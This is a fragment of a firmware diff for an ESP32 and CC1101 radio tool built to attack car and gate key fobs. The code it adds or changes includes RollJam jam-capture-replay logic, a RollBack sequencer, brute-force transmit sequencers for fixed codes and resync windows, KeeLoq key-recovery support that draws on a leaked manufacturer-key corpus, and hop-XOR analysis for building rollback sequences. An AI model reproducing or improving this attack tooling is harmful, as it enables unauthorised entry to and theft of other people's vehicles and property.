+// cipher. Note: §2 and §3.2 contain two errors, documented and
 //     NOT applied — §2's vectors are ENCRYPT not DECRYPT (ENC matches 3/3), and
 //     §3.2's 0x2E7 is wrong (0x3FF is a 10-bit mask, so serial&0x3FF = 0x0E7).
 //     Applying §3.2 would have made the KAT pass a wrong implementation.
@@ -867,7 +1197,7 @@
 //     validates the framing gate only: none of those captures contains the
 //     400/800us pattern, so the crypto rejection path is untested on real RF.
 //     The RAW-export polarity assumption (§3.4a) is also still open. C2 not
-//     started, per research/07 §6.
+// started, §6.
 //
 // v3.64 (2026-09-26) — KeeLoq framing + match-predicate fix, V1 gate, V2/V3.
 //   Two defects in the KeeLoq frame path made every key match wrong. They
@@ -1320,7 +1650,9 @@
 //   {"cmd":"setfreq","f":868.35}    — lock RF to a specific frequency
 //   {"cmd":"squelch","dbm":-60}     — set auto-capture threshold (dBm)
 //   {"cmd":"key_recover"}           — attempt full MFR-key search (needs 2+ frames)
+//   {"cmd":"hop_xor"}               — key-independent hop-XOR telemetry over held frames
 //   {"cmd":"key_probe","key":"...","name":"label"}  — test a candidate key
+//   {"cmd":"brute_status"}          — progress of the HTTP brute sequencers
 //   {"cmd":"add_user_key","n":"label","k":"HEX64"}  — save a device key to NVS
 //   {"cmd":"del_user_key","idx":0}  — remove a saved key by index
 //   {"cmd":"key_list"}              — list all saved user keys
@@ -1473,6 +1805,13 @@
 #endif
 #include <driver/twai.h>
 
+// ─── HopXor telemetry struct ─────────────────────────────────────────────────
+// Hoisted above the auto-generated prototype block. See ks_hopXorPair() for the
+// full explanation; this placement is load-bearing (arduino-cli emits prototypes
+// before the sketch's own struct definitions otherwise).
+struct HopXor { uint32_t hop_xor, ctr_xor, sn_xor; uint8_t flipBits, wordOrder;
+                bool ctrStep1, sameBtn; };
+
 // ─── Pins (DO NOT CHANGE) ─────────────────────────────────────────────────────
 #define PIN_MOSI         35
 #define PIN_MISO         33
@@ -1491,13 +1830,13 @@
 #define RGB_N             1
 
 // ─── Config ───────────────────────────────────────────────────────────────────
-#define FW_VER        "FOBworks for SGP v3.82"
+#define FW_VER        "FOBworks for SGP v4.01"
 // Minimum battery voltage under which a CC1101 TX burst is refused (PA current spike
 // can otherwise sag a weak pack below the MCU brown-out threshold mid-transmission).
 #define TX_BATT_FLOOR_V 3.30f
 #define AP_SSID       "SGP Card Mini"
 #define CAP_SZ         512
-// research/23 §2.1: the import body limit expressed in pulses. A corpus .sub runs 4.38 bytes
+// §2.1: the import body limit expressed in pulses. A corpus .sub runs 4.38 bytes
 // per pulse (verified: 297934 bytes / 67977 pulses), so an 8192-byte body carries ~1869
 // pulses. The parser cap and every import staging buffer must match this, or the accepted
 // body is wider than what can be searched -- which is how a 512-pulse cap ended up refusing
@@ -1506,14 +1845,20 @@
 // limits must move together: the instruction raised only the pulse cap to 1868, which is
 // the correct figure for an 8192-byte body but still short of the first frame at 2517, so
 // the stated goal ("posting the corpus file's head must import successfully") would not
-// have been met. See research/23 §4 step 1.
+// have been met. See §4 step 1.
 #define SUB_REPLAY_MAX_PULSES 3740
 // Largest serial command line accepted. Was an inline 255, which silently discarded any
-// longer command -- see the note at the read loop. Sized for the widest command the firmware
-// takes; the import's pulse list is the largest, and its handler bounds that payload.
-#define SERIAL_CMD_MAX 8192
+// longer command -- see the note at the read loop. 2048 covers every serial command with
+// margin: the widest is fbk_pulses_add's documented 48-pulse slice (~240 B) plus headers,
+// and even the legacy one-shot fbk_import needs ~1 KB only for a small body -- the staged
+// form carries anything larger. The previous 8192 was a fossil from
+// the one-shot import era; with a fixed intake buffer it cost 8 KB of DRAM permanently,
+// which this WiFi/BLE build cannot spare (measured: boot heap dropped from ~6.5 KB to
+// ~176 B free, starving serialEmit's String churn). 2048 keeps 4x the largest sane line
+// while returning ~6 KB of heap.
+#define SERIAL_CMD_MAX 2048
 uint32_t serialRxQueueActual=0;   // what setRxBufferSize() actually achieved (0 = failed)
-// Stack instrumentation (research/28 §3.2). There was none, which is why the first real
+// Stack instrumentation. There was none, which is why the first real
 // frame had to crash to reveal the limit. uxTaskGetStackHighWaterMark(NULL) returns the
 // MINIMUM free stack (in words) since the task started, i.e. the worst case so far -- so after
 // one bench session the value IS the measurement, and a regression shows as a shrinking
@@ -1633,7 +1978,7 @@ float    rfFreqB = 0.0f;
 // transmits correct levels. Defaults true for entries built by protocol generators.
 // ctr/hasCtr: the rolling counter this capture decoded to, when the decoder
 // supplied one. Used by fbkCtrOrder() to reject two entries carrying the SAME code,
-// which cannot produce a valid RollBack sequence (research/10 §2.5).
+// which cannot produce a valid RollBack sequence.
 struct FbkEntry { uint16_t w[CAP_SZ]; int len; float freq; uint32_t ts; bool sh;
                   uint32_t ctr; bool hasCtr;
                   // trimmed = the block was reduced to ONE frame. Only Kia V3/V4 has a
@@ -1641,7 +1986,7 @@ struct FbkEntry { uint16_t w[CAP_SZ]; int len; float freq; uint32_t ts; bool sh;
                   // multi-repeat block is kept and this is false. C1/C2 are only
                   // correct when this is true, which is why rbArm/rjArm gate on it and
                   // report "untrimmed-block" rather than failing silently
-                  // (research/12 §2/§3 P1).
+                  //
                   bool trimmed; };
 static FbkEntry fbkBuf[FBK_MAX];
 static int      fbkCount = 0;
@@ -1668,7 +2013,7 @@ uint32_t capMaxMsOverride = 0;
 // toggles is not evidence the signal came from the CC1101. It governs all three paths that
 // could otherwise be fooled by a toggle -- jam, replay, and capture.
 //
-// Set true only on a board where GDO0 really is wired. `research/14` records the measurement and
+// Set true only on a board where GDO0 really is wired. records the measurement and
 // the vendor firmware says the same; neither is a reason to probe for it at runtime, because a
 // probe cannot tell the two chips' pins apart.
 bool gdo0Routed = false;
@@ -1676,14 +2021,92 @@ bool gdo0Routed = false;
 // Per-stage capture diagnostics. Off by default; `{"cmd":"cap_diag","on":true}` turns it on
 // and the next capture logs how many pulses survive each post-processing stage. This exists
 // because a capture that reaches the gates with transitions and leaves empty reports only
-// "Too few edges", which does not say which gate dropped it (research/50 §4).
+// "Too few edges", which does not say which gate dropped it.
 bool lastCapDiag = false;
+
+// ── Frame-gap arming ─────────────
+// The signal wait fires on FIRST ENERGY: the first RSSI excursion over the
+// trigger threshold. That is right for a fob — the first energy IS the preamble
+// — but a long leading carrier with an unmodulated head (Flipper tx_from_file on
+// a RAW .sub: the file's `te` field holds the carrier on before the first pulse
+// edge) parks the edge detector on a plateau of AGC ringing. The plateau fills
+// the 512-slot edge buffer with transitions that are not frame data
+// (measured in the trials: raw=512/512, ended=BUFFER_FULL,
+// after75=9..13, peak −67 dBm against a −83 floor — the signal was there the
+// whole time; the buffer just filled on the wrong thing).
+//
+// The fix is to keep polling through first energy and arm the buffer only when
+// the carrier shows a FRAME-GAP SIGNATURE: a run of quiet (below edgeThr) that
+// is longer than any intra-frame pulse yet shorter than the inter-frame silence.
+// A real preamble follows within one frame of that quiet run — the carrier is
+// off, then the frame starts — so the wait ends with the buffer armed at a
+// boundary instead of mid-plateau. Two guards keep this from eating a fob press:
+//
+//   · Quiet-run length: every known protocol here has an intra-frame gap below
+//     ~4 ms (KeeLoq 2×TE ≤ 1.5 ms, Kia V3/V4 separators ~1–2 ms, Toyota
+//     preamble pairs ~500 µs), so a quiet run ≥ 6 ms cannot be intra-frame
+//     content. Inter-frame silence is tens of ms, so 6 ms sits below it too —
+//     the quiet run is bounded from both sides and cannot be either extreme.
+//   · Restart budget: if no signature appears within GAPARM_RESTART_BUDGET_MS
+//     of first energy, arm anyway at the current position. A fob preamble that
+//     begins the instant the trigger fired (the common case) would otherwise
+//     wait out the whole budget on a carrier that never gaps; the fob case must
+//     never be slower than today. The budget is measured from FIRST ENERGY,
+//     not from capture start, so the default wait path is untouched.
+//
+// Off by default (auto-capture and sweep behavior unchanged); opt in per capture
+// with {"cmd":"capture","arm":"gap"} or globally with {"cmd":"gaparm","on":true}.
+uint16_t gapArmQuietUs  = 6000;    // quiet run that arms (µs; intra-frame max ~4 ms, inter-frame ≥ tens of ms)
+uint16_t gapArmBudgetMs = 400;     // give up waiting for the signature after this (ms of first energy)
+uint8_t  gapArmRetries  = 3;      // budget expiries on a live carrier to tolerate before falling back (N16)
+int8_t   gapArmQuietBelowDb = 6;   // quiet means r <= edgeThr − this (dB). The AGC plateau rides AT
+                                   // edgeThr during a RAW playback; only a true gap drops below it (bench)
+bool     gapArmDefault  = false;   // arm every capture this way unless a capture says otherwise
+int8_t   gapArmPerCapture = -1;   // one-shot per-capture override from the capture command; -1 = none
+bool     lastCapGapArm   = false;  // last capture armed on the gap signature (true) or budget expiry (false)
+
+// ── AGC filter length for capture (N17, follow-up) ──────────────
+// The stock AGCCTRL0 FILTER_LENGTH=16 average holds ~150 µs of RSSI memory, so
+// sub-150 µs OOK lows ride against their highs and the RSSI edge detector sees a
+// plateau instead of modulation. measured ~1/8 of a Kia frame's
+// pulses resolved at that setting. This knob rewrites AGCCTRL0 at capture setup
+// (8/16/32/64 samples); the shorter the filter, the faster the envelope tracks
+// and the noisier the floor. Default 16 = today's behavior, exactly.
+uint8_t  agcFilterLen   = 16;     // samples: 8, 16 (default), 32, or 64
+bool     lastCapAgc      = false;  // true when the last capture ran a non-default filter
+
 
 bool captureSignal(uint16_t timeoutMs,uint32_t gapUs);
 
 // Forward declarations: these are defined further down, but the C2/C1 sequencers,
 // fbkAppend and fbkImportFrame all call them before that point.
 static int  rjTrimKiaV34(const uint16_t* w,int len,uint16_t* out,int outCap,int* anchorOut=nullptr);
+
+// Decoder forward declarations for the consensus adapters (N10). The adapters
+// live before the decoders in the file; these let them compile.
+static bool ks_decodeToyota(const uint32_t* buf,int cnt,uint32_t& serial,uint8_t& btn,uint16_t& ctr);
+static bool ks_decodeSubaru(const uint32_t* buf,int cnt,uint32_t& fixId,uint8_t& ctr,uint8_t& btn,bool& valid);
+static bool ks_decodeMazda(const uint32_t* buf,int cnt,uint32_t& hop,uint32_t& serial,uint8_t& ctr,uint8_t& btn,bool& valid);
+static bool ks_decodeKiaV0(const uint32_t* buf,int cnt,uint32_t& serial,uint16_t& ctr,uint8_t& btn,bool& valid);
+
+// The Arduino .ino preprocessor auto-generates function prototypes and inserts
+// them at the TOP of the generated .cpp, which places ks_consensusVote's
+// prototype ABOVE this file's typedef for its function-pointer parameter — a
+// compile error ('ks_protoDecode_t' has not been declared). Declaring the
+// typedef this early, before any function that uses it, keeps the generated
+// prototype valid regardless of where the arduino-builder inserts it.
+typedef bool (*ks_protoDecode_t)(const uint32_t*,int,uint32_t&,uint8_t&,uint16_t&);
+static void ks_consensusVote(const uint16_t* w,int len,ks_protoDecode_t fn,
+                             uint32_t sn,uint8_t btn,int* agree,int* total);
+static bool ks_consPSA(const uint32_t* b,int n,uint32_t& sn,uint8_t& btn,uint16_t& ctr);
+static bool ks_decodePSA(const uint16_t* w,int n,int te,
+                        uint32_t& serial,uint16_t& roll,uint8_t& btn,
+                        int& payLen,uint8_t pay[26]);
+static bool ks_consFiatV1(const uint32_t* b,int n,uint32_t& sn,uint8_t& btn,uint16_t& ctr);
+static bool ks_decodeFiatV1(const uint16_t* w,int n,uint32_t& serial,uint8_t& btn,
+                            uint16_t& ctr,uint32_t& hop,uint8_t& variant);
+static bool ks_decodeRenaultHitag2(const uint16_t* w,int n,uint32_t& serial,uint8_t& btn,
+                                   uint16_t& ctr,uint32_t& hop,uint8_t& tail,uint32_t& key2);
 
 // ─── C2: RollBack sequencer ─────────────────────────────────────────────────
 // The RollBack attack against a rolling-code receiver with a resync window:
@@ -1697,7 +2120,7 @@ static int  rjTrimKiaV34(const uint16_t* w,int len,uint16_t* out,int outCap,int*
 // Why here: FOBback already captures a run of raw codes into fbkBuf. RollBack is
 // the same capture with a specific two-code transmission order and a configurable
 // gap, so it is a sequencer on top of existing machinery rather than new capture
-// code. research/04 C2.
+// code. C2.
 //
 // Guard rails, deliberately conservative because this transmits:
 //   · exactly two codes, code 0 then code 1 — never a loop
@@ -1725,6 +2148,10 @@ static String   rbLastJson = "{\"event\":\"rollback\",\"state\":\"idle\"}";
 // function, which is after this point.
 bool replayRaw(float mhz,uint16_t* data,int len,int reps,bool startHigh);
 bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int reps);
+// buildForProto() is defined with the TX helpers far below; the brute sequencers
+// (bruteTick and friends, ~line 4720) call it, so declare it here too.
+static int buildForProto(const String& proto, uint32_t sn, uint32_t newCtr,
+                         uint16_t teUs, uint8_t ctrl, uint16_t* bufOut, int maxLen);
 
 
 // ─── Protocol / Vehicle-Make Capture Filters ─────────────────────────────────
@@ -1767,7 +2194,11 @@ static const VehicleProfile VEHICLES[] = {
   {"Jeep",      "Chrysler",      "",               "",                315.00f, 433.92f},
   {"Peugeot",   "KeeLoq",        "",               "",                433.92f,   0.f  },
   {"Citroen",   "KeeLoq",        "",               "",                433.92f,   0.f  },
-  {"Renault",   "KeeLoq",        "",               "",                433.92f,   0.f  },
+  // Renault's remote is Hitag2 (a stream cipher), not KeeLoq —
+  // FIAT V1 and Renault V1 share the same 104-bit Manchester physical layer, so FIAT
+  // is listed first (it is dispatched first and claims its own frames); Renault-V1
+  // is the on-brand decoder.
+  {"Renault",   "FIAT-V1",        "Renault-V1/Hitag2","",               433.92f,   0.f  },
   {"Opel",      "KeeLoq",        "",               "",                433.92f,   0.f  },
   {"Vauxhall",  "KeeLoq",        "",               "",                433.92f,   0.f  },
   {"Fiat",      "KeeLoq",        "",               "",                433.92f,   0.f  },
@@ -1799,11 +2230,16 @@ float   stickyFreq = 0.0f; // 0 = no sticky (full-speed sweep)
 uint8_t stickyPrio = 0;    // 1 = heuristic fob · 2 = KeeLoq / Toyota-Denso
 
 // ── BLE scanner (ESP32-S3 built-in BLE radio) ─────────────────────────────────
+// uuids is 64 B, not 200: one service UUID ("0000fd50-0000-1000-8000-00805f9b34fb")
+// is 36 chars + NUL, and only one is stored per entry. The 200-byte form cost
+// 2.7 KB of BSS across 20 entries — BSS the v3.88 boot heap needed (the first
+// v3.88 flash crashed in Wire.begin's mutex alloc because statics had grown past
+// the idle-heap floor ).
 struct BleEntry {
   char addr[18];
   char name[33];
   int  rssi;
-  char uuids[200];
+  char uuids[64];
   char mfrHex[48];
   char system[28];
 };
@@ -1883,6 +2319,18 @@ struct KiaV34Frame {
   bool     validated;
 };
 
+// Renault V1 (Hitag2) feed state — see ks_h2_feed() with the decoder below.
+// Declared here with the other decoder state structs because the Arduino
+// auto-prototype block is emitted after this region, so a type used in a
+// signature has to exist before it (the same reason KiaV34Frame lives here).
+struct KsH2Dec {
+  int step; uint32_t te_last; int mstate;
+  uint16_t te_high, te_low;
+  uint64_t acc; uint32_t cnt;
+  uint16_t header; uint64_t data; uint64_t key2;
+  bool valid; uint64_t lastD, lastD2;
+};
+
 #define KL_CAND_MAX 8          // candidates retained per frame (expected: ~1.3)
 struct KLCand { const char* name; uint64_t key; uint8_t learn; bool suspect; };
 
@@ -1891,7 +2339,7 @@ struct KLCand { const char* name; uint64_t key; uint8_t learn; bool suspect; };
 // Carried per manufacturer key. The learning type decides which key
 // diversification the device key came from, so it decides which derivations are
 // worth generating for that key. Values and meanings match the leaked-corpus
-// type field and the reference keeloq_common.h (see research/01, section 1).
+// type field and the reference keeloq_common.h.
 //   UNKNOWN   — type not recorded; several interpretations are possible, so a
 //               match is reported as unconfirmed.
 //   SIMPLE    — device key == manufacturer key.
@@ -1918,7 +2366,7 @@ enum KLLearn : uint8_t {
 //             dashboard's "pattern" badge means. 0 for a real, typed key.
 struct MfrKey  { const char* name; uint64_t key; uint8_t learn; uint8_t suspect; };
 
-// Stack high-water sampler (research/28 §3.2). Defined here, after the type declarations,
+// Stack high-water sampler. Defined here, after the type declarations,
 // because the sketch preprocessor hoists prototypes above the body -- a function defined
 // earlier would land before these types exist.
 static void stackSample(){
@@ -1975,9 +2423,57 @@ uint8_t hfcState  = HFC_SCANNING;
 String  hfcProto  = "";     // protocol name of last rolling-code capture
 static Preferences hsPrefs;
 
+// N13: fingerprint-histogram storage. Separate namespace from hslib so the
+// headless library clear doesn't wipe the timing fingerprints. n13TotalPop is
+// the total capture count across all buckets (RAM mirror of the sum).
+static Preferences n13Prefs;
+static uint32_t    n13TotalPop = 0;
+static bool        n13Ready    = false;
+// Mirror of distinct bucket keys, because Preferences has no key-iteration
+// API. Fixed ring of N13_KEY_RING entries; the newest key replaces the
+// oldest when full. Populations older than the ring are still in NVS, just
+// not listable — a full histogram dump can be re-derived by re-capturing.
+// 16 entries, not 64: v3.88's first flash crashed at boot (lock_init abort in
+// Wire.begin — heap exhausted) because this ring alone held 1792 B of BSS.
+// 16 recent buckets covers a drawer of fobs plus ambient devices; the NVS
+// side is unbounded either way.
+#define N13_KEY_RING 16
+struct N13Key { char key[17]; uint32_t pop; uint32_t lastMs; };
+static N13Key  n13Keys[N13_KEY_RING];
+static int     n13KeyCount = 0;
+// Fold a bucket update into the mirror ring.
+static void n13KeyMirror(const char* k,uint32_t pop){
+  for(int i=0;i<n13KeyCount;i++){
+    if(strcmp(n13Keys[i].key,k)==0){
+      n13Keys[i].pop=pop; n13Keys[i].lastMs=(uint32_t)millis(); return;
+    }
+  }
+  if(n13KeyCount<N13_KEY_RING){
+    strlcpy(n13Keys[n13KeyCount].key,k,sizeof(n13Keys[0].key));
+    n13Keys[n13KeyCount].pop=pop;
+    n13Keys[n13KeyCount].lastMs=(uint32_t)millis();
+    n13KeyCount++;
+  } else {
+    // Ring full: replace the entry with the oldest last-seen time.
+    int oldest=0;
+    for(int i=1;i<N13_KEY_RING;i++)
+      if(n13Keys[i].lastMs<n13Keys[oldest].lastMs) oldest=i;
+    strlcpy(n13Keys[oldest].key,k,sizeof(n13Keys[0].key));
+    n13Keys[oldest].pop=pop;
+    n13Keys[oldest].lastMs=(uint32_t)millis();
+  }
+}
+
 // ─── LED / Buzzer / Battery ───────────────────────────────────────────────────
 void setLed(uint8_t r,uint8_t g,uint8_t b){
-  if(ledReinit){rgb.begin();ledReinit=false;}
+  // rgb.begin() allocates an RMT channel; on core 3.3.12 a SECOND allocation
+  // aborts inside rmtInit (RMT alloc exhausted) -- the crash loop seen on the
+  // bench after any beep(): ledcDetach freed the pin's peripheral bus, the
+  // ledReinit flag then re-began the strip, and the RMT alloc died. begin()
+  // is only safe before the first ledcAttach on the LED pin; after that, the
+  // strip keeps its channel and setPixelColor/show work without re-beginning.
+  // (Found by the N16 round's flash; backtrace: setLed -> show -> rmtInit.)
+  if(ledReinit){ledReinit=false;}
   rgb.setPixelColor(0,rgb.Color(r,g,b)); rgb.show();
 }
 void beep(int hz,int ms){
@@ -2011,6 +2507,15 @@ void serialEmit(const String& json){
   // events, including serial replies and capture results, go to authenticated clients.
   //
   // Declared here, defined with the rest of the WebSocket code below.
+  int slot=wsReplyTo;
+  if(slot>=0) wsSendToSlot(slot,wsReplyToGen,json);
+  else        wsBroadcast(json);
+}
+// Same stream, no trailing newline — for handlers that assemble ONE JSON reply
+// across several calls (N11/N13 table dumps). The terminating call is
+// serialEmitNoNl(...) followed by serialEmit("") which adds the newline.
+void serialEmitNoNl(const String& json){
+  Serial.print(json);
   int slot=wsReplyTo;
   if(slot>=0) wsSendToSlot(slot,wsReplyToGen,json);
   else        wsBroadcast(json);
@@ -2199,7 +2704,16 @@ static void wsStart(){
   httpd_register_uri_handler(wsServer, &uri);
   addLog("[WS] ws://"+WiFi.softAPIP().toString()+":81 ready");
 }
-static String serialInBuf="";
+// Serial line intake: a FIXED char buffer, not a String. The v3.86 defect
+// class was deserializeJson beside a heap-resident line; the
+// v3.92 fuzz round found the same weakness in the INTAKE:
+// serialInBuf += ch is up to SERIAL_CMD_MAX heap reallocations per line, on
+// an idle heap of 2-3 KB. A 9 KB adversarial burst fragmented the heap and
+// wedged the CDC stream (tick lines with missing heads) until a hard reset.
+// A static array makes intake allocation-free; the dispatch String is built
+// once, only when a line actually closes.
+static char   serialInBuf[SERIAL_CMD_MAX + 1];
+static size_t serialInLen = 0;
 
 // ─── Per-device control-surface credentials ───────────────────────────────────
 // Generate both secrets from the ESP32 hardware RNG and persist them in a
@@ -2625,7 +3139,7 @@ static void hfc_doReplay(){
 // ─── Power on (called from doPowerOff wake loop) ──────────────────────────────
 static void doPowerOn(){
   systemON = true;
-  rgb.begin(); rgb.setBrightness(80);
+  rgb.setBrightness(80);
   setLed(0, 0, 255); delay(200);
   // Boot tones (ascending)
   beep(600, 60); delay(20); beep(1200, 60); delay(20); beep(2400, 100);
@@ -2698,7 +3212,9 @@ static void doPowerOff(){
   // ── WOKE UP — require a fresh 3 s hold to power on (SGP_Hacker pattern) ──
   // If the user releases before 3 s, go back to sleep.
   while(true){
-    rgb.begin(); rgb.setBrightness(80); setLed(0, 0, 0);
+    // No rgb.begin() here -- a second RMT alloc aborts after the buzzer ran
+    // (see setLed's comment). Brightness survives; the strip keeps its channel.
+    setLed(0, 0, 0);
     unsigned long hs = millis(); bool ok = false;
     while(digitalRead(PIN_BTN) == LOW){
       unsigned long h = millis() - hs;
@@ -3001,7 +3517,7 @@ bool cc_init(float mhz){
   // and cc_reset() only issues SRES — which does not by itself drive GDO0, the
   // async TX data input. Holding GDO0 LOW as an OUTPUT puts a definite
   // no-carrier level on that input across the reset, before SIDLE and the RX
-  // reconfiguration below. setup() does the same thing first (`research/09` §2.2);
+  // reconfiguration below. setup does the same thing first (§2.2);
   // it is repeated here so cc_init() is safe to call on any path, including the
   // /api/reinit route.
   pinMode(PIN_GDO0,OUTPUT);
@@ -3184,7 +3700,7 @@ static inline uint32_t ks_klDec1(uint32_t& hi,uint32_t& lo,uint64_t key){
 // only ever produce a false positive, and every recovery run spent budget on
 // them first.
 //
-// Provenance is recorded in `research/01` §1; the corpus
+// Provenance is recorded in §1; the corpus
 // itself is the MFR_KEYS table below. The upstream corpus file is not shipped with this
 //
 //   · 72 gate/barrier/shutter/alarm entries, from a publicly leaked key list.
@@ -3618,6 +4134,75 @@ static void ks_klRecentPush(const KLFrame& f){
   KL_RECENT_BUF[KL_RECENT_HEAD] = f;
   KL_RECENT_HEAD = (KL_RECENT_HEAD + 1) % KL_RECENT_MAX;
   if(KL_RECENT_CNT < KL_RECENT_MAX) KL_RECENT_CNT++;
+}
+
+// ─── Hop-XOR telemetry ───────────────────────────────────────────────────
+// Every field of a KeeLoq transmission except the hop word is plaintext, and
+// the hop word is an invertible block cipher over a counter. Two presses of the
+// same button differ ONLY in the counter (the button nibble and the serial
+// discriminator are fixed), so
+//
+//     hop_xor  =  hopA ^ hopB  =  E(ptA) ^ E(ptB)
+//
+// is a key-independent observable. This is the property that makes rollback
+// sequence validation possible without recovering the manufacturer key: the
+// same XOR is reproduced by replaying the two captured frames in either order.
+// It also lets a structural decode be sanity-checked by looking at how many bit
+// positions move between presses — a genuine fob flips a sparse, low-entropy
+// set (the counter's ripple carry), while two noise frames XOR to ~16 bits.
+//
+// The routine is pure (no globals beyond the types) so it can be unit-tested on
+// the host without the radio: it takes two KLFrame records directly.
+static HopXor ks_hopXorPair(const KLFrame& A,const KLFrame& B){
+  HopXor hx;
+  hx.hop_xor = A.hop  ^ B.hop;
+  hx.ctr_xor = A.rawCtr ^ B.rawCtr;
+  hx.sn_xor  = A.sn   ^ B.sn;
+  hx.flipBits = (uint8_t)__builtin_popcount(hx.hop_xor);
+  // sameBtn is the trust gate: if the two frames were produced by different
+  // buttons the XOR of the hop words is NOT the clean counter-delta signature
+  // and no inference about structure should be drawn from it. The button lives
+  // in the low nibble of sn (ks_parseKL packs sn = (disc<<4)|btn).
+  hx.sameBtn = ((A.sn & 0x0F) == (B.sn & 0x0F));
+  // KeeLoq's fixed bit order is unknown to the receiver, but Microchip's own
+  // encoders and every dump analysed so far put the counter in the LOW 16 bits
+  // of the plaintext. Report which way the raw transmitted counter (already the
+  // plaintext field, not the cipher output) steps between the two presses.
+  int32_t d = (int32_t)B.rawCtr - (int32_t)A.rawCtr;
+  hx.ctrStep1 = (d==1) || (d==-(int32_t)0xFFFF);   // +1, or wrap 0x0000->0xFFFF
+  hx.wordOrder = 0;                                 // 0 = unknown/plain; see note above
+  return hx;
+}
+
+// Ring indexing helpers. Kept separate and pure so the wrap-around order is
+// unit-testable without the JSON layer.
+static uint8_t ks_hopRingStart(){ return (KL_RECENT_HEAD + KL_RECENT_MAX - KL_RECENT_CNT) % KL_RECENT_MAX; }
+static const KLFrame& ks_hopRingAt(uint8_t i){ return KL_RECENT_BUF[(ks_hopRingStart()+i)%KL_RECENT_MAX]; }
+
+// Render the ring plus one XOR strip per consecutive pair. Shared by the serial
+// "hop_xor" command and the /api/hop_xor route so both report the same numbers.
+// A pair with identical hop words (repeat=true, xor=0x00000000) is a fob that
+// transmitted the same frame twice — no rollback sequence can be built from it.
+static void ks_hopXorEmit(JsonDocument& doc){
+  uint8_t n = KL_RECENT_CNT;
+  doc["count"] = n;
+  doc["max"]   = KL_RECENT_MAX;
+  JsonArray fr = doc["frames"].to<JsonArray>();
+  for(uint8_t i=0;i<n;i++){
+    const KLFrame& f = ks_hopRingAt(i);
+    JsonObject o = fr.add<JsonObject>();
+    char hh[12]; snprintf(hh,12,"0x%08lX",(unsigned long)f.hop);
+    o["hop"]=hh; o["sn"]=f.sn; o["btn"]=f.btn; o["ctr"]=f.rawCtr;
+    if(i>0){
+      const KLFrame& prev = ks_hopRingAt(i-1);
+      HopXor hx = ks_hopXorPair(prev, f);
+      char xh[12]; snprintf(xh,12,"0x%08lX",(unsigned long)hx.hop_xor);
+      char ch[12]; snprintf(ch,12,"0x%04lX",(unsigned long)hx.ctr_xor);
+      o["hop_xor"]=xh; o["ctr_xor"]=ch; o["sn_xor"]=hx.sn_xor;
+      o["flip_bits"]=hx.flipBits; o["ctr_step1"]=hx.ctrStep1;
+      o["same_btn"]=hx.sameBtn; o["repeat"]=(prev.hop==f.hop);
+    }
+  }
 }
 
 // KeeLoq encrypt — Microchip TB003 / AN742 normal-learn scheme.
@@ -4111,7 +4696,7 @@ static uint32_t rjCtr1=0, rjCtr2=0;
 static bool     rjHasCtr1=false, rjHasCtr2=false;
 static bool     rjTrim1=false, rjTrim2=false;    // was each capture reduced to one frame?
 static float    rjFreq=0.0f;
-static float    rjJamOffset=0.150f;          // +150 kHz, per `research/04` C1
+static float    rjJamOffset=0.150f;          // +150 kHz, per C1
 static bool     rjArmed=false;
 static bool     rjReplayed=false;            // true once press 1 was retransmitted
 static String   rjLastJson="{\"event\":\"rolljam\",\"state\":\"idle\"}";
@@ -4131,7 +4716,7 @@ static void rjReset(){
   rjTrim1=rjTrim2=false;
 }
 
-// Does the second capture follow the first? Reuses the C2 rule (research/10 §2.5):
+// Does the second capture follow the first? Reuses the C2 rule:
 // two entries are not two codes, and a pair that is not forward-ordered cannot
 // produce a working RollJam.  1 = ordered, 0 = unknown, -1 = reject.
 static int rjCtrOrder(){
@@ -4188,14 +4773,14 @@ static void rjTick(){
     case RJ_JAM1: {
       // Press 1 in flight: capture it now, then re-jam while press 2 arrives.
       // The capture drops the jam for its duration (single radio), which is the
-      // window research/04 says to validate on a bench.
+      // window says to validate on a bench.
       if(cc_fastRSSI() > autoCapDbm){
         stopJam();
         delayMicroseconds(RJ_JAM_SETTLE_US);
         cc_setCaptureOOK();
         if(captureSignal(RJ_CAP_TIMEOUT, RJ_CAP_GAP_US) && rfLen>8){
           // Trim to one frame: a capture holds ~3 repeats of the same code, and the
-          // RollJam replay must send ONE press, not three (research/11 §2 F2).
+          // RollJam replay must send ONE press, not three.
           { static uint16_t _t[CAP_SZ];
             int _tl=rjTrimKiaV34(rfBuf,rfLen,_t,CAP_SZ,nullptr);
             if(_tl>0){ memcpy(rjBuf1,_t,_tl*sizeof(uint16_t)); rjLen1=_tl; rjTrim1=true; }
@@ -4225,7 +4810,7 @@ static void rjTick(){
         cc_setCaptureOOK();
         if(captureSignal(RJ_CAP_TIMEOUT, RJ_CAP_GAP_US) && rfLen>8){
           // Trim to one frame: a capture holds ~3 repeats of the same code, and the
-          // RollJam replay must send ONE press, not three (research/11 §2 F2).
+          // RollJam replay must send ONE press, not three.
           { static uint16_t _t[CAP_SZ];
             int _tl=rjTrimKiaV34(rfBuf,rfLen,_t,CAP_SZ,nullptr);
             if(_tl>0){ memcpy(rjBuf2,_t,_tl*sizeof(uint16_t)); rjLen2=_tl; rjTrim2=true; }
@@ -4248,7 +4833,7 @@ static void rjTick(){
       // protocol each capture is still ~3 repeats of its code and the replay would
       // look to the car like three presses of press 1. Refuse and attribute it rather
       // than sending a sequence that may be wrong in a way nobody can see
-      // (research/12 §2 / §3 P1).
+      //
       if(!rjTrim1||!rjTrim2){
         rjLastJson="{\"event\":\"rolljam\",\"state\":\"aborted\",\"reason\":\"untrimmed-block\"}";
         serialEmit(rjLastJson);
@@ -4294,7 +4879,113 @@ static void rjTick(){
   }
 }
 
+// ─── Tick-driven brute routes (§2.7) ─────────────────────────────────────────
+// /api/resync_probe and /api/fixed_bruteforce used to run their whole transmit
+// loop inside the WebServer callback. At the maximum (1024 addresses × 20 ms)
+// that held the loop for ~20 s: status polling stalled and browsers dropped the
+// request. These two sequencers run the same loops from loop() instead, one
+// transmit per tick, with a delay between them and a progress event every
+// BRUTE_PROGRESS_STEP frames — exactly the shape rbTick()/rjTick() already use.
+//
+// Both are single-flight: a second arm while one is active is refused rather
+// than queued, so the radio is never driven by two sequences at once.
 
+#define BRUTE_MAX_N          1024
+#define BRUTE_PROGRESS_STEP  50
+#define BRUTE_TICK_BUDGET_MS 25   // min delay between transmits: keeps status/browser alive
+
+enum BruteKind : uint8_t { BR_IDLE=0, BR_RESYNC, BR_FIXED };
+static BruteKind bruteKind = BR_IDLE;
+static float     bruteFreq=0.0f;
+static String    bruteProto, bruteKindName;
+static uint32_t  bruteSn=0, bruteBaseAddr=0;
